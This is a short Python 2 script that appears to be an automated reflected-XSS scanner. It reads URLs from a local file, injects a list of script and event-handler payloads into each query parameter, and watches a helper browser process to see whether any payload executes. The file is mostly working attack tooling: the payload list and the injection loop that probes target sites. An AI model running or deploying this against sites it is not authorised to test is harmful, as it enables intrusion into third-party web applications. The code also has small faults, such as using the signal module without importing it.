# coding: utf8
# code by flyr4nk
# 
#############


import sys
import os
from time import time,sleep
import urlparse
import urllib2
import subprocess

xsscases=['"/>"><body onload=alert(1)>','alert(1)','>\'>\"><script>window.a==1?1:alert(a=1)</script>','--></script><script>window.a==1?1:alert(a=1)</script>','\';alert(1);\'','</script><script>alert(1);//']

#xsscases=['--></script><script>window.a==1?1:alert(a=1)</script>','</script><script>alert(1);//']

paichu=['.css','.js?','.gif','.jpg','.png','.swf']

def assign(service, arg):
    r = urlparse.urlparse(arg)
    pairs = urlparse.parse_qsl(r.query)
    if urlparse.urlparse(arg).query.find('=') == -1 or len(pairs) > 10 or arg.find('?')==-1:
        return
    for case in paichu:
        if case in r.path:
              return
    return True, arg

def check_xss(action,query,i):
     for xsscase in xsscases:
         query2=[]
         query2=query[:]
         query2[i]=query2[i]+xsscase
         querystr='&'.join(query2)
         cmd = '%s?%s' % (action,querystr)
         print cmd
         cmd=urllib2.quote(cmd)
         argv1=[]
         argv1.append('python')
         argv1.append('browser.py')
         argv1.append(cmd)
         child=subprocess.Popen(argv1,stdout=subprocess.PIPE)
         print 'subprocess.pid:%s' % child.pid
         starttime=time()
         xhtj=1
         while xhtj:
             ret=child.poll()
             if ret==0:
                  xhtj=0
                  print 'pid closed:%s'%child.pid
                  out=child.stdout.readlines()
                  print out
                  if out:
                      return        
             else:
                   sleep(1)
                   print ret
                   if time()-starttime >12:
                         os.kill(child.pid, signal.SIGKILL)
                         xhtj=0
                         return
                         

         
def audit(arg):
    url = arg.split('?')
    query=url[1].split('&')
    httpurl=url[0]
    length=len(query)
    for i in range(length):
         check_xss(httpurl,query,i)
        


if __name__=='__main__':   
    file_object=open('c:/url.txt','r')
    while 1:
        try:
          line=file_object.readline()
          if not line:
              break
          testurl=assign('www',line)
          if testurl:
                audit(line.rstrip('\n'))
	except Exception:
             continue     
    file_object.close()

